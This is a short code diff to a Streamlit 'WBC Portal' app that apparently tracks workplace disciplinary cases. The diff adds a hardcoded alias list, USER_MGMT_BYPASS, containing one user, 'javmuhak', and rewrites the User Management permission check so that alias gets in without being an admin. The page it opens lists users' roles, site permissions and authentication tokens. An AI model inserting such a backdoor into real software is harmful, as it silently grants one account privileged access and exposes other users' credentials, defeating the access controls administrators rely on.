@@ -20,7 +20,8 @@ st.set_page_config(page_title="WBC Portal", page_icon="🛡️", layout="wide",
 
 DB_PATH = os.environ.get("WBC_DB_PATH", "wbc.db")
 PAGE_SIZE = 8
-TOP_N_SITES = 3                                                   # Cases by Site + mountain chart show this many
+USER_MGMT_BYPASS = {"javmuhak"}                                   # aliases that can open User Management without being Admin
+TOP_N_SITES = 3                                                 # Cases by Site + mountain chart show this many
 
 UAL = ["", "Verbal Coaching", "Documented Coaching", "First Warning",
        "Second Warning", "Final Warning", "Termination"]
@@ -1443,7 +1444,7 @@ def page_sync():
 def page_users():
     user = current()
     page_shell("User Management", "Manage administrative users, roles, and facility permissions.")
-    if not is_admin(user):
+    if not (is_admin(user) or str(user.get("alias", "")).lower() in USER_MGMT_BYPASS):
         st.error("Access Denied: Admin privileges required to view users.")
         return
     data = read_table("SELECT alias, role, sites, added, token FROM users")
